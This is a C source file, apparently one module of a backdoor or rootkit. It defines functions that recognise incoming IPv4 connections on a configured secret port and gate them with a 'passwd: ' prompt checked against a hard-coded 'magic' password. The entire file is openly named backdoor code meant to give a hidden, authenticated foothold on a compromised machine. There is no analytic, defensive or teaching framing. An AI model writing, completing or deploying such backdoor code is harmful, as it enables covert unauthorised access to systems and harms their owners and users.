#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "backdoor.h"
#include "config.h"

void init_backdoor(void){
}

int is_backdoor_c(const struct sockaddr* addr, socklen_t addrlen){
	if(addr->sa_family == AF_INET){
		struct sockaddr_in* sn = (struct sockaddr_in*)addr;
		return ntohs(sn->sin_port) == backdoorp;
	}

	return 0;
}

int handle_bd(int sockfd){
	char buffer[256];
	ssize_t bt_read;
	const char* p = "passwd: ";
	write(sockfd, p, strlen(p));
	bt_read = read(sockfd, buffer, sizeof(buffer)-1);
	if(bt_read <= 0) return -1;
	buffer[bt_read-1] = '\0';
	if(strcmp(buffer, magicpd) != 0){
		const char* m = "access denied\n";
		write(sockfd, m, strlen(m));
		return -1;
	}

	return 0;
}
